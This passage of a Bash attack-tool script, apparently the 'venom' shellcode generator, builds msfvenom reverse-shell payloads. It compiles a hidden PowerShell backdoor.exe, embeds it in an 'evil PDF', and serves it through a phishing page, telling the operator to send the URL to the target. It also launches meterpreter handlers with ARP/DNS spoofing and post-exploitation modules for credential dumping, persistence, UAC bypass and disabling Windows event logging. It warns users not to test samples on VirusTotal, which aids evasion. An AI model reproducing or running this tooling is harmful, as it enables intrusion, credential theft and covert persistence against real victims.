\"[x] Invoke-Phant0m.rb not found ..\"\n      sleep 2\n      echo \"[☠] copy Invoke-Phant0m.rb to msfdb ..\"\n      sleep 2\n      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1\n      echo \"[☠] Reloading msfdb database ..\"\n      sleep 2\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n    fi\n\n      #\n      # check if Invoke-Phantom.ps1 exists ..\n      #\n      if [ -e \"$IPATH/aux/Invoke-Phant0m.ps1\" ]; then\n        echo \"[☠] Invoke-Phant0m.ps1 found ..\"\n        sleep 2\n        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\n      else\n        echo \"[x] Invoke-Phant0m.ps1 not found ..\"\n        sleep 2\n        echo \"[☠] Please place module in $IPATH/aux folder ..\"\n        sleep 2\n        exit\n      fi\n\n\n  else\n\n    echo \"do nothing\" > /dev/null 2>&1\n\nfi\n\n\n# ZIP payload files before sending? (apache2)\nrUn=$(zenity --question --title=\"☠ SHELLCODE GENERATOR ☠\" --text \"Zip payload files?\" --width 270) > /dev/null 2>&1\n    if [ \"$?\" -eq \"0\" ]; then\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m.zip|g\" mega.html > copy.html\n      mv copy.html $ApAcHe/index.html > /dev/null 2>&1\n      # copy from output\n      cd $IPATH/output\n      echo \"[☠] creating archive -> $N4m.zip\"\n      zip $N4m.zip $N4m.vbs > /dev/null 2>&1\n      cp $N4m.zip $ApAcHe/$N4m.zip > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n    else\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m.vbs|g\" mega.html > copy.html\n      mv copy.html $ApAcHe/index.html > /dev/null 2>&1\n      # copy from output\n      cd $IPATH/output\n      cp $N4m.vbs $ApAcHe/$N4m.vbs > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n    fi\n\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n\n            if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ]; thenif [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            fi\n\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n\n            if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            fi\n          fi\n\n\n        else\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n\n            if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            fi\n\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n\n            if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            fi\n          fi\n        fi\n   fi\n\n\nsleep 2\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nmv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1\nmv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1\nmv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1\nrm $IPATH/templates/phishing/copy.html > /dev/null 2>&1\nrm $IPATH/output/chars.raw > /dev/null 2>&1\nrm $ApAcHe/$N4m.zip > /dev/null 2>&1\nrm $ApAcHe/$N4m.vbs > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\nsleep 2\nclear\ncd $IPATH/\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_microsoft_menu\n  clear\nfi\n}\n\n\n\n\n\n# ----------------------------------------------------\n# EVIL PDF BUILDER\n# ----------------------------------------------------\nsh_shellcode15 () {\n\necho \"[☠] EVIL PDF BUILDER -> running...\"\necho \"[☠] targets: windows xp/vista/7!\"\nsleep 1\n# input PDF output format\noUt=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nevil PDF builder\\ncrypting mechanisms available:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"base64\" FALSE \"random xor key\" --width 300 --height 200) > /dev/null 2>&1\n\n\nif [ \"$oUt\" = \"base64\" ]; then\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\nN4m=$(zenity --entry --title \"☠ ENTER PDF NAME ☠\" --text \"Enter pdf output name\\nexample: EvilPdf\" --width 300) > /dev/null 2>&1\nMyd0=$(zenity --title \"☠ SELECT PDF FILE TO BE EMBEDDED ☠\" --filename=$IPATH --file-selection --text \"chose PDF file to use to be serve as template\") > /dev/null 2>&1\n# input payload choise\npaylo=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nAvailable Payloads:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"windows/shell_bind_tcp\" FALSE \"windows/shell/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp_dns\" FALSE \"windows/meterpreter/reverse_http\" FALSE \"windows/meterpreter/reverse_https\" FALSE \"windows/meterpreter/reverse_winhttps\" FALSE \"windows/x64/meterpreter/reverse_tcp\" FALSE \"windows/x64/meterpreter/reverse_https\" --width 350 --height 370) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"EvilPdf\";fi\nif [ -z \"$Myd0\" ]; then echo \"${RedF}[x]${white} This Module Requires PDF absoluct path input\";sleep 3; sh_exit;fi\n\necho \"[☠] Building shellcode -> psh-cmd format ...\"\nsleep 2\nif [ \"$oUt\" = \"base64\" ] && [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ]; then\necho \"[☠] meterpreter over SSL sellected ..\"\nsleep 1\nfi\n\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    TROJAN  : $N4m.pdf\n    FORMAT  : PSH-CMD -> WINDOWS\n    PAYLOAD : $paylo\n\n!\n\n# use metasploit to build shellcode\nif [ \"$oUt\" = \"base64\" ] && [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ]; then\nxterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd > $IPATH/output/chars.raw\"\nelse\nxterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw\"\nfi\n\n\n# display shellcode\nstr0=`cat $IPATH/output/chars.raw | awk {'print $12'}`\necho \"\"\necho \"[☠] obfuscating -> base64 encoded!\"\nsleep 2\necho $str0\necho \"\"\nsleep 2\n\n# EDITING/BACKUP FILES NEEDED\necho \"\"\necho \"[☠] editing/backup files...\"\nsleep 2\n\n   # check if chars.raw as generated\n   if [ -e $Ch4Rs ]; then\n      echo \"[☠] chars.raw -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] chars.raw -> not found!\"\n      exit\n      fi\n\n\necho \"[☠] Building template -> template.c!\"\nsleep 2\n# build template file in C language\n# reproduction of venom option 6 payload\necho \"// C template | Author: r00t-3xp10it\" > $IPATH/output/template.c\necho \"// execute shellcode powershell base 64 encoded into memory (ram)\" >> $IPATH/output/template.c\necho \"\" >> $IPATH/output/template.c\necho \"#include <stdio.h> \" >> $IPATH/output/template.c\necho \"#include <stdlib.h> \" >> $IPATH/output/template.c\necho \"\" >> $IPATH/output/template.c\necho \"int main()\" >> $IPATH/output/template.c\necho \"{\" >> $IPATH/output/template.c\necho ' system(\"powershell -nop -exec bypass -win Hidden -noni -enc InJ3C\"); ' >> $IPATH/output/template.c\necho \" return 0; \" >> $IPATH/output/template.c\necho \"}\" >> $IPATH/output/template.c\n\n# injecting shellcode into template using SED+bash variable ( $str0 ) = command substitution\nsed -i \"s|InJ3C|$str0|\" $IPATH/output/template.c\n\n\n# compile template.c into one stand-alone-executable file using mingw32\n# template.c (C code to be compiled) -o (save output name)\necho \"[☠] Compiling template.c -> backdoor.exe!\"\nsleep 2\n$ComP $IPATH/output/template.c -o $IPATH/output/backdoor.exe -mwindows\nstrip --strip-debug $IPATH/output/backdoor.exe\n\n\n\n# if you wish to inject your build in another pdf file then change: ( INFILENAME ) switch by the full path to your pdf file\n# using msfconsole to embedded the backdoor.exe into one pdf file (remmenber to exit msfconsole: exit -y)\nxterm -T \" EVIL PDF BUILDER \" -geometry 110x23 -e \"msfconsole -x 'use windows/fileformat/adobe_pdf_embedded_exe;set EXE::Custom $IPATH/output/backdoor.exe;set FILENAME $N4m.pdf;set INFILENAME $Myd0;exploit;exit -y'\" > /dev/null 2>&1\n\n\n# move files from metasploit to local directory\nmv ~/.msf4/local/$N4m.pdf $IPATH/output/$N4m.pdf\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.pdf\\n\\nchose how to deliver: $N4m.pdf\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 230) > /dev/null 2>&1\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n        if [ \"$MsFlF\" = \"ON\" ]; then\n\n           if [ \"$oUt\" = \"base64\" ] && [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ]; then\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n           else\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n           fi\n\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n\n           if [ \"$oUt\" = \"base64\" ] && [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ]; then\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n           else\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n           fi\n        fi\n      sleep 2\n\n\n   else\n\n\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"enum_system.rc\" FALSE \"dump_credentials.rc\" FALSE \"fast_migrate.rc\" FALSE \"persistence.rc\" FALSE \"privilege_escalation.rc\" FALSE \"stop_logfiles_creation.rc\" FALSE \"exploit_suggester.rc\" --width 305 --height 350) > /dev/null 2>&1\n\n  if [ \"$P0\" = \"persistence.rc\" ]; then\n  M1P=$(zenity --entry --title \"☠ AUTO-START PAYLOAD ☠\" --text \"\\nAuto-start payload Every specified hours 1-23\\n\\nexample: 23\\nwill auto-start $N4m.pdf on target every 23 hours\" --width 300) > /dev/null 2>&1\n\n    cd $IPATH/aux\n    # Build persistence script (AutoRunStart='multi_console_command -r')\n    cp persistence.rc persistence[bak].rc\n    sed -i \"s|N4m|$N4m.pdf|g\" persistence.rc\n    sed -i \"s|IPATH|$IPATH|g\" persistence.rc\n    sed -i \"s|M1P|$M1P|g\" persistence.rc\n\n    # Build listenner resource file\n    echo \"use exploit/multi/handler\" > $lhost.rc\n    echo \"set LHOST $lhost\" >> $lhost.rc\n    echo \"set LPORT $lport\" >> $lhost.rc\n    echo \"set PAYLOAD $paylo\" >> $lhost.rc\n    echo \"exploit\" >> $lhost.rc\n    mv $lhost.rc $IPATH/output/$lhost.rc\n    cd $IPATH\n\n    elif [ \"$P0\" = \"privilege_escalation.rc\" ]; then\n      cd $IPATH/aux\n      # backup files needed\n      cp privilege_escalation.rc privilege_escalation[bak].rc\n      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb\n      # Build resource files needed\n      sed -i \"s|N4m|$N4m.pdf|g\" privilege_escalation.rc\n      sed -i \"s|IPATH|$IPATH|g\" privilege_escalation.rc\n      sed -i \"s|N4m|$N4m.pdf|g\" enigma_fileless_uac_bypass.rb\n      # reload metasploit database\n      echo \"[☠] copy post-module to msf db!\"\n      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb\n      echo \"[☠] reloading -> Metasploit database!\"\n      xterm -T \" reloading -> Metasploit database \" -geometry 110x23 -e \"sudo msfconsole -x 'reload_all; exit -y'\" > /dev/null 2>&1\n      cd $IPATH\n\n\n  elif [ \"$P0\" = \"stop_logfiles_creation.rc\" ]; then\n    #\n    # check if dependencies exist ..\n    #\n    if [ -e \"$pHanTom/post/windows/manage/Invoke-Phant0m.rb\" ]; then\n      echo \"[☠] Invoke-Phant0m.rb installed ..\"\n      sleep 2\n    else\n      echo \"[x] Invoke-Phant0m.rb not found ..\"\n      sleep 2\n      echo \"[☠] copy Invoke-Phant0m.rb to msfdb ..\"\n      sleep 2\n      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1\n      echo \"[☠] Reloading msfdb database ..\"\n      sleep 2\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n    fi\n\n      #\n      # check if Invoke-Phantom.ps1 exists ..\n      #\n      if [ -e \"$IPATH/aux/Invoke-Phant0m.ps1\" ]; then\n        echo \"[☠] Invoke-Phant0m.ps1 found ..\"\n        sleep 2\n        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\n      else\n        echo \"[x] Invoke-Phant0m.ps1 not found ..\"\n        sleep 2\n        echo \"[☠] Please place module in $IPATH/aux folder ..\"\n        sleep 2\n        exit\n      fi\n\n\n  else\n\n    echo \"do nothing\" > /dev/null 2>&1\n\nfi\n\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m.pdf|g\" mega.html > copy.html\n      cp copy.html $ApAcHe/index.html > /dev/null 2>&1\n      cd $IPATH/output\n      cp $N4m.pdf $ApAcHe/$N4m.pdf > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m.pdf|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m.pdf $ApAcHe/$N4m.pdf\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n\n           if [ \"$oUt\" = \"base64\" ] && [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ]; then\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n           else\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            fi\n\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n\n           if [ \"$oUt\" = \"base64\" ] && [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ]; then\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n           else\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            fi\n          fi\n\n\n        else\n\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n\n            if [ \"$oUt\" = \"base64\" ] && [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            fi\n\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n\n            if [ \"$oUt\" = \"base64\" ] && [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            fi\n          fi\n        fi\n   fi\n\n\n\n\n# ---------------------------------------\n# chose to build the xor encrypted one :D\n# ---------------------------------------\nelse\n\n\n\n# config settings in PDF_encoder.py script\nec=`echo ~`\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\nN4m=$(zenity --entry --title \"☠ ENTER PDF OUTPUT NAME ☠\" --text \"Enter pdf output name\\nexample: XorPdf\" --width 300) > /dev/null 2>&1\necho \"[☠] editing/backup files...\"\nsleep 2\ncd $IPATH/templates/evil_pdf\ncp PDF_encoder.py PDF_encoder[bak].py\n# config pdf_encoder.py\nsed -i 